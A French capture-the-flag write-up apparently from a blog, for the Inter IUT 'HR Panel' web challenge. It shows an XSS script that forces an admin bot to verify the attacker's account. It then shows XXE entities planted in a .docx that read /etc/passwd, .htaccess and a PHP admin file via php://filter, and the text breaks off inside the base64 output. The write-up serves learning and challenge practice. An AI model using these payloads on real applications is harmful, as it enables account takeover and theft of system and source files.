+    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&#34;</span> <span class="na">integrity</span><span class="o">=</span><span class="s">&#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&#34;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&#34;anonymous&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://code.jquery.com/jquery-3.3.1.slim.min.js&#34;</span> <span class="na">integrity</span><span class="o">=</span><span class="s">&#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&#34;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&#34;anonymous&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&#34;</span> <span class="na">integrity</span><span class="o">=</span><span class="s">&#34;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&#34;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&#34;anonymous&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&#34;</span> <span class="na">integrity</span><span class="o">=</span><span class="s">&#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&#34;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&#34;anonymous&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/assets/css/form.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">nav</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;navbar navbar-expand-lg navbar-light bg-ligh&#34;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;navbar-brand&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;/assets/Images/logo.png&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;45&#34;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;40&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;d-inline-block align-top&#34;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
+    Inter IUT
+  <span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;collapse navbar-collapse&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;navbarNavAltMarkup&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;navbar-nav&#34;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link active&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/admin/users&#34;</span><span class="p">&gt;</span>Admin <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;sr-only&#34;</span><span class="p">&gt;</span>(current)<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/services&#34;</span><span class="p">&gt;</span>Services<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/contact&#34;</span><span class="p">&gt;</span>Contact<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/me&#34;</span><span class="p">&gt;</span>My account<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>  
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/logout&#34;</span><span class="p">&gt;</span>Logout<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">nav</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;row&#34;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col text-center&#34;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;form&#34;</span><span class="p">&gt;</span> 
+                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lead&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: #529bc0;&#34;</span><span class="p">&gt;</span>Welcome Admin ! You can fill out the form below to verify a user&#39;s account.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+                                <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
+                    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Z1-526-MQ&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;20&#34;</span> <span class="na">required</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+                    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-primary&#34;</span><span class="p">&gt;</span>Verify this account<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+                <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;fixed-bottom text-center&#34;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: #529bc0;&#34;</span><span class="p">&gt;</span>Inter IUT HR Services V1.1-8<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</details>
+
+<p>Sur la page reçue on observe quelque chose de très intéressant : Un joli formulaire qui a tout l&rsquo;air de nous permettre d&rsquo;être vérifié et donc d&rsquo;accéder possiblement à de nouvelles fonctionnalités</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lead&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: #529bc0;&#34;</span><span class="p">&gt;</span>Welcome Admin ! You can fill out the form below to verify a user&#39;s account.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
+	<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Z1-526-MQ&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;20&#34;</span> <span class="na">required</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+	<span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-primary&#34;</span><span class="p">&gt;</span>Verify this account<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div><p>On va donc forcer le bot à réaliser ce formulaire et envoyer ce formulaire de la même manière que précédemment en spécifiant notre propre <em>username</em> avec la payload suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+  <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="s1">&#39;/admin/users&#39;</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+  <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+  <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;username=A5-596-LZ&#34;</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p>Après quelques secondes, nous pouvons cliquer sur la page services qui met à disposition 3 nouvelles fonctionnalités :</p>
+<ul>
+<li>Access my pay slips (Permet d&rsquo;acceder à ses fiches de payes)</li>
+<li>Manage my vacations (Permet de planifier des jours de congés)</li>
+<li>Create HR requests (Permet de signaler un problème avec comme complément un .docx détaillant le problème)</li>
+</ul>
+<p>La mention <strong>BETA VERSION</strong> sur la dernière fonctionnalité indique la voie à prendre.</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/account_validated.gif"
+	width="1024"
+	height="419"
+	srcset="/p/inter-iut-hr-panel-1-2-3/account_validated_hua938845382243fd14cb742a3cfce6a13_209099_480x0_resize_box.gif 480w, /p/inter-iut-hr-panel-1-2-3/account_validated_hua938845382243fd14cb742a3cfce6a13_209099_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p>Après quelques tentatives infructueuses de bypass les filtres sur l&rsquo;upload du fichier .docx dans le but d&rsquo;y envoyer un reverse shell en PHP, on décide de simplement envoyer un .docx et de voir ce qui se passe. N&rsquo;ayant pas de .docx sous la main on peut rapidement en générer un grace à python et la lib docx nativement intégrer :</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">docx</span> <span class="kn">import</span> <span class="n">Document</span>
+<span class="n">doc</span> <span class="o">=</span> <span class="n">Document</span><span class="p">()</span>
+<span class="n">content</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">add_paragraph</span><span class="p">(</span><span class="s2">&#34;Je m&#39;appelle Alex Winchest et j&#39;adore jouer à cache-cache&#34;</span><span class="p">)</span>
+<span class="n">doc</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&#34;resume.docx&#34;</span><span class="p">)</span>
+</code></pre></div><p>On rédige et en envoie le document dans le formulaire, puis une fois envoyé, on constate que le backend parse notre resume.docx afin d&rsquo;y afficher son contenu :</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/test_hr.gif"
+	width="1024"
+	height="419"
+	srcset="/p/inter-iut-hr-panel-1-2-3/test_hr_huf2dce4b313c83a2ecfd92a65a52c119d_120330_480x0_resize_box.gif 480w, /p/inter-iut-hr-panel-1-2-3/test_hr_huf2dce4b313c83a2ecfd92a65a52c119d_120330_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<h2 id="exploitation-dune-local-file-inclusion-lfi-grâce-à-une-xml-external-entity-injection-xxe-dans-le-docx">Exploitation d&rsquo;une Local File Inclusion (LFI) grâce à une XML External Entity Injection (XXE) dans le .docx</h2>
+<p>Après une rapide recherche on s&rsquo;aperçoit qu&rsquo;il est possible de glisser une XXE dans le resume.docx. En effet les fichiers .docx ne sont que des archives contenant principalement des fichiers .xml. On peut donc unzip le .docx et aller modifier le contenu se situant dans /word/document.xml</p>
+<p>Le but ici est d&rsquo;ajouter un entête qui va être exécuté par le backend (en l&rsquo;occurrence ici on testera une LFI sur le fichier /etc/passwd afin de voir si cela fonctionne) et d&rsquo;y incorporer le résultat à la place de notre paragraphe.</p>
+<p>Dans un premier temps il faut extraire les fichiers .xml zippé à l&rsquo;intérieur du .docx :</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/unzipDOCX.png"
+	width="366"
+	height="337"
+	srcset="/p/inter-iut-hr-panel-1-2-3/unzipDOCX_hu1aea460d6cfdc68f5f82674b6d2aeaac_19680_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/unzipDOCX_hu1aea460d6cfdc68f5f82674b6d2aeaac_19680_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="108"
+		data-flex-basis="260px"
+	
+></p>
+<p>Puis on édite /word/document.xml comme suit : en dessous de la première ligne il faut insérer la ligne suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE test [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;</span>]&gt;
+</code></pre></div><p><img src="/p/inter-iut-hr-panel-1-2-3/afteredit1.png"
+	width="605"
+	height="52"
+	srcset="/p/inter-iut-hr-panel-1-2-3/afteredit1_hu8ad4b91292db86e53bf9eceaa08807fc_18457_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/afteredit1_hu8ad4b91292db86e53bf9eceaa08807fc_18457_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1163"
+		data-flex-basis="2792px"
+	
+></p>
+<p>Pour récupérer le résultat de l&rsquo;exécution, on change le contenu de notre paragraphe par</p>
+<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">&amp;test;
+</code></pre></div><p><img src="/p/inter-iut-hr-panel-1-2-3/afteredit2.png"
+	width="175"
+	height="28"
+	srcset="/p/inter-iut-hr-panel-1-2-3/afteredit2_hu8dc4e1f39ed19d0c9633bc4e88366281_2544_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/afteredit2_hu8dc4e1f39ed19d0c9633bc4e88366281_2544_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="625"
+		data-flex-basis="1500px"
+	
+></p>
+<p>Pour terminer on re-zip le tout :</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/rezip.png"
+	width="357"
+	height="54"
+	srcset="/p/inter-iut-hr-panel-1-2-3/rezip_hue71a6db5fc6dcaf6c41b783f1a1b0f34_8327_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/rezip_hue71a6db5fc6dcaf6c41b783f1a1b0f34_8327_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="661"
+		data-flex-basis="1586px"
+	
+></p>
+<p>On peut maintenant envoyer notre formulaire :</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/lfi_passwd.gif"
+	width="1024"
+	height="419"
+	srcset="/p/inter-iut-hr-panel-1-2-3/lfi_passwd_huccdcda7fb633d03a51785bff5116b643_318086_480x0_resize_box.gif 480w, /p/inter-iut-hr-panel-1-2-3/lfi_passwd_huccdcda7fb633d03a51785bff5116b643_318086_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p>Et &hellip;&hellip;. BINGO, nous avons une magnifique LFI. Mais maintenant que faire avec elle ? Et bien rappelons-nous nous qu&rsquo;il y avait une fichier .htaccess dans le robots.txt, alors tentons de le récupérer. Il est commun de retrouver ce fichier dans l&rsquo;arborescence /var/www/html, on replacera donc  notre payload dans resume.docx par la suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE test [&lt;!ENTITY test SYSTEM &#39;php://filter/convert.base64-encode/resource=/var/www/html/.htaccess&#39;&gt;</span>]&gt;
+</code></pre></div><p><em>Vous noterez que j&rsquo;ai utilisé un wrapper php ici, en fait on peut toujours utiliser file:/// c&rsquo;est juste que je n&rsquo;ai pas gaffe lors du writeup, dans tous les cas on en aura besoin par la suite)</em></p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/lfi_htaccess.gif"
+	width="1024"
+	height="419"
+	srcset="/p/inter-iut-hr-panel-1-2-3/lfi_htaccess_hubbe04c4e07fdc5499a1471eaef213193_266165_480x0_resize_box.gif 480w, /p/inter-iut-hr-panel-1-2-3/lfi_htaccess_hubbe04c4e07fdc5499a1471eaef213193_266165_1024x0_resize_box.gif 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p>Et &hellip;&hellip;. BINGO, on peut maintenant décoder et récupérer le contenu de ce fichier .htaccess (qui sans grande surprise contient le routage des urls) :</p>
+<p><details>
+	<summary>Contenu .htaccess encodé en base64</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">T3B0aW9ucyAtSW5kZXhlcwpFcnJvckRvY3VtZW50IDQwNCAvNDA0LnBocApFcnJvckRvY3VtZW50IDQwMyAvNDAzLnBocApSZXdyaXRlRW5naW5lIG9uClJld3JpdGVCYXNlIC8KUmV3cml0ZVJ1bGUgXnJlZ2lzdGVyJCAvY29yZS9yZWdpc3Rlci5waHAKUmV3cml0ZVJ1bGUgXmxvZ291dCQgL2NvcmUvbG9nb3V0LnBocApSZXdyaXRlUnVsZSBebWUkIC9jb3JlL2FjY291bnQucGhwClJld3JpdGVSdWxlIF5jb250YWN0JCAvY29yZS9jb250YWN0LnBocApSZXdyaXRlUnVsZSBebG9nJCAvY29yZS9sb2dpbi5waHAKUmV3cml0ZVJ1bGUgXmRlbGV0ZSQgL2NvcmUvZGVsZXRlLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMkIC9jb3JlL3NlcnZpY2VzLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMvc2xpcHMkIC9jb3JlL3NlcnZpY2VzL3NsaXBzLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMvdmFjYXRpb25zJCAvY29yZS9zZXJ2aWNlcy92YWNhdGlvbnMucGhwClJld3JpdGVSdWxlIF5zZXJ2aWNlcy9yZXF1ZXN0cyQgL2NvcmUvc2VydmljZXMvcmVxdWVzdHMucGhwClJld3JpdGVSdWxlIF5hZG1pbi91c2VycyQgL2NvcmUvYWRtaW4vdXNlcnMucGhwClJld3JpdGVSdWxlIF5hZG1pbi9ub3J6aF9tYW5hZ2VtZW50JCAvY29yZS9hZG1pbi9pbnRlcml1dF9pbnRlcm5hbF9tYW5hZ2UucGhwCg====
+</code></pre></div>
+</details>
+
+<details>
+	<summary>Contenu .htaccess</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">Options -Indexes
+ErrorDocument 404 /404.php
+ErrorDocument 403 /403.php
+RewriteEngine on
+RewriteBase /
+RewriteRule ^register$ /core/register.php
+RewriteRule ^logout$ /core/logout.php
+RewriteRule ^me$ /core/account.php
+RewriteRule ^contact$ /core/contact.php
+RewriteRule ^log$ /core/login.php
+RewriteRule ^delete$ /core/delete.php
+RewriteRule ^services$ /core/services.php
+RewriteRule ^services/slips$ /core/services/slips.php
+RewriteRule ^services/vacations$ /core/services/vacations.php
+RewriteRule ^services/requests$ /core/services/requests.php
+RewriteRule ^admin/users$ /core/admin/users.php
+RewriteRule ^admin/norzh_management$ /core/admin/interiut_internal_manage.php
+</code></pre></div>
+</details>
+</p>
+<p>La dernière route, jusqu&rsquo;ici inconnue est intrigante : &ldquo;admin/norzh_management&rdquo;, en tentant d&rsquo;y accéder directement depuis le naviguateur on s&rsquo;aperçoit qu&rsquo;il s&rsquo;agit d&rsquo;une ressource uniquement accessible en interne :</p>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/adminforbidden.png"
+	width="1008"
+	height="260"
+	srcset="/p/inter-iut-hr-panel-1-2-3/adminforbidden_hu017a8a2add66151594d57031c283d6a6_18739_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/adminforbidden_hu017a8a2add66151594d57031c283d6a6_18739_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="387"
+		data-flex-basis="930px"
+	
+>
+Ça tombe bien car nous sommes aussi à l&rsquo;intérieur du serveur l&rsquo;entreprise, alors récupérons ce fichier grâce à notre LFI sur le .docx :</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!DOCTYPE test [&lt;!ENTITY test SYSTEM &#39;php://filter/convert.base64-encode/resource=/var/www/html/core/admin/interiut_internal_manage.php&#39;&gt;</span>]&gt;
+</code></pre></div><!-- raw HTML omitted -->
+<p>Et une fois de plus c&rsquo;est le jackpot :</p>
+<p><details>
+	<summary>Contenu interiut_internal_manage.php encodé en base64</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">PD9waHAKLy9DVEZJVVR7OGJiODQ4OTE4OTdkN2VlYTUyNDRkZGJiMTY2MmQwZGVmNmMzMDUwMWMzODI2OWRiMDQ4M2Q4OTJjODBkYWRjZX0Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoIWlzc2V0KCRfU0VTU0lPTlsiZW1haWwiXSkpewogICAgaGVhZGVyKCJMb2NhdGlvbjogLyIpOwogICAgZGllKCk7Cn0KcmVxdWlyZV9vbmNlKCIuLi8uLi9jb3JlL2RhdGFiYXNlX2Nvbm5lY3QucGhwIik7CiRkYiA9IFNxbENvbm5lY3Rpb246OmdldENvbm5lY3Rpb24oKTsKJHN0aCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSBlbWFpbCA9IDplbWFpbCIpOwokc3RoLT5iaW5kVmFsdWUoIjplbWFpbCIsJF9TRVNTSU9OWyJlbWFpbCJdKTsKJHN0aC0+ZXhlY3V0ZSgpOwokcmVzdWx0ID0gJHN0aC0+ZmV0Y2hBbGwoKTsKCi8vaGVhZGVyCmluY2x1ZGUoIi4uLy4uL3RlbXBsYXRlcy9oZWFkZXIucGhwIik7Cj8+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL2Fzc2V0cy9jc3MvZm9ybS5jc3MiPgo8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWV4cGFuZC1sZyBuYXZiYXItbGlnaHQgYmctbGlnaCI+CiAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyI+CiAgICA8aW1nIHNyYz0iL2Fzc2V0cy9JbWFnZXMvbG9nby5wbmciIHdpZHRoPSI0NSIgaGVpZ2h0PSI0MCIgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGFsaWduLXRvcCIgYWx0PSIiPgogICAgSW50ZXIgSVVUCiAgPC9hPgogIDxkaXYgY2xhc3M9ImNvbGxhcHNlIG5hdmJhci1jb2xsYXBzZSIgaWQ9Im5hdmJhck5hdkFsdE1hcmt1cCI+CiAgICA8ZGl2IGNsYXNzPSJuYXZiYXItbmF2Ij4KICAgICAgICA8YSBjbGFzcz0ibmF2LWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ii8iPkhvbWU8L2E+CiAgICAgICAgPD9waHAgaWYoJHJlc3VsdFswXVsiaXNBZG1pbiJdID09PSAiMSIpeyA/PjxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayBhY3RpdmUiIGhyZWY9Ii9hZG1pbi91c2VycyI+QWRtaW4gPHNwYW4gY2xhc3M9InNyLW9ubHkiPihjdXJyZW50KTwvc3Bhbj48L2E+PD9waHAgfSA/PgogICAgICAgIDxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayIgaHJlZj0iL3NlcnZpY2VzIj5TZXJ2aWNlczwvYT4KICAgICAgICA8YSBjbGFzcz0ibmF2LWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ii9jb250YWN0Ij5Db250YWN0PC9hPgogICAgICAgIDxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayIgaHJlZj0iL21lIj5NeSBhY2NvdW50PC9hPiAgCiAgICAgICAgPGEgY2xhc3M9Im5hdi1pdGVtIG5hdi1saW5rIiBocmVmPSIvbG9nb3V0Ij5Mb2dvdXQ8L2E+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9uYXY+Cjw/cGhwIGlmKCRfU0VSVkVSWyJSRU1PVEVfQUREUiJdID09PSAiMTI3LjAuMC4xIil7ID8+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbCB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibGVhZCIgc3R5bGU9ImNvbG9yOiAjNTI5YmMwOyI+QXBwbGljYXRpb24gbWFuYWdlbWVudCBzZXJ2aWNlLiBTdGF0dXMgb2Ygc2VydmljZXM6PC9wPgogICAgICAgICAgICAgICAgPHRhYmxlIGNsYXNzPSJ0YWJsZSI+CiAgICAgICAgICAgICAgICAgICAgPHRoZWFkPgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0iY29sIj4jPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRoIHNjb3BlPSJjb2wiPlNlcnZpY2U8L3RoPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9ImNvbCI+U3RhdGU8L3RoPgogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgIDwvdGhlYWQ+CiAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0icm93Ij4xPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvY29udGFjdCI+Q29udGFjdCBwYWdlPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgI